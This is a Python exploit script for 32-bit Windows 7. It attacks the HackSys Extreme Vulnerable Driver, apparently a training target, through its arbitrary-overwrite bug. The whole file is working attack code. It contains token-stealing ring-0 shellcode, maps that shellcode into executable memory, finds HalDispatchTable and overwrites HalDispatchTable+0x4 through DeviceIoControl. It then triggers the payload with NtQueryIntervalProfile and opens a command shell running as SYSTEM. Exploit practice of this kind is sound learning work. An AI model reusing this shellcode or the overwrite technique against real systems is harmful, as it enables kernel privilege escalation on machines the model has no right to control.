#######################################################
 Purpose: Win7 x86 HEVD Arbitrary Overwrite           #
 Written By: Eric Van Zutphen                         #
#######################################################

import ctypes, sys, struct
from ctypes import *
from subprocess import *


#Define the Class
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

kernel32 = windll.kernel32
ProcessStatusAPI = windll.Psapi
ntdll = windll.ntdll


#System Token Stealing Payload
print "[*]            Stealing SYSTEM Token           [*]"

shellcode = ""
shellcode += bytearray(
		"\x90\x90\x90\x90"		  # Nop Sled
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\x31\xc0"                        # xor eax,eax
		"\x83\xc4\x24"					  # add esp, 0x24
        "\x5d"                            # pop ebp                    |Restore Original Resgisters to Resume Execution Flow
        "\xc2\x08\x00"                    # ret 0x8
)

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => None                         #
#   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
#   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
#   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
# );                                                                  #
#---------------------------------------------------------------------#
print "[*]        VirtualAlloc() to Bypass DEP        [*]"
ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
final_exploit = struct.pack("<L",ptr)


shellcode_address = id(shellcode) + 20
shellcode_final = struct.pack("<L",ptr)
shellcode_final_address = id(final_exploit) + 20 
print "[*]   Address of ring0 shellcode: {0}    [*]".format(hex(shellcode_address))
print "[*]   Pointer for ring0 shellcode: {0}   [*]".format(hex(shellcode_final_address))

#This will define the IOCTL
IOCTL = hex((0x00000022 << 16) | (0x00000000 << 14) | (0x802 << 2) | 0x00000003)
print "[*]         CTL code is: " + IOCTL + "              [*]" 

#Enumerate for the HALDispatchTable
base_addresses = (c_ulong * 1024)()
enumerate = ProcessStatusAPI.EnumDeviceDrivers(byref(base_addresses), c_int(1024), byref(c_long()))
if not enumerate:
	print "[*] Enumeration Failed! [*]"
	sys.exit(-1)
for address in base_addresses:
	if not address:
		continue
	get_base_name = c_char_p('\x00' * 1024)
	get_driver_base_name =	ProcessStatusAPI.GetDeviceDriverBaseNameA(address, get_base_name, 48)
	if not get_driver_base_name:
		print "[*] Unable to Get Driver Base Name [*]"
		sys.exit(-1)
	if get_base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in get_base_name.value.lower():
		base_name = get_base_name.value
		print "[*]       Loaded Kernel: {0}          [*]".format(base_name)
		print "[*] Base Address of Loaded Kernel: {0} [*]".format(hex(address))
		break



win_kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)

if not win_kernel_handle:
	print "Cannot Get Kernal Handle"
	sys.exit(-1)



HAL_Dispatch_table_address = kernel32.GetProcAddress(win_kernel_handle, 'HalDispatchTable')

if not HAL_Dispatch_table_address:
	print "Could not get HAL Dispatch  Table!"
	sys.exit(-1)
	
	
# Subtracting ntkrnlpa base in user space
HAL_Dispatch_table_address -= win_kernel_handle
 
# To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
HAL_Dispatch_table_address += address
 
# Just add 0x4 to HAL address for HalDispatchTable+0x4
HAL_plus_4 = HAL_Dispatch_table_address + 0x4
 
print "[*]       HalDispatchTable    : {0}    [*]".format(hex(HAL_Dispatch_table_address))
print "[*]     HalDispatchTable+0x4  : {0}    [*]".format(hex(HAL_plus_4))

 
#What-Where
www = WriteWhatWhere()
www.What = shellcode_final_address
www.Where = HAL_plus_4
wwwpointer = pointer(www)
 
print "[*]      What :       {0}                [*]".format(hex(www.What))
print "[*]      Where:       {0}              [*]".format(hex(www.Where))


#Load HackSysDriver
HackSysDriver = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
if not HackSysDriver or HackSysDriver == -1:
    print "[*] Could Not Get HackSysDriver Handle! [*]"
    sys.exit(0)
 
exploit = wwwpointer
#exploitLength = len(exploit)


kernel32.DeviceIoControl(HackSysDriver, 0x22200b, exploit, 0x8, None, 0, byref(c_ulong()), None)
ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
print "[*]        Popping a NT/System Shell!!!        [*]"
Popen("start cmd", shell=True)
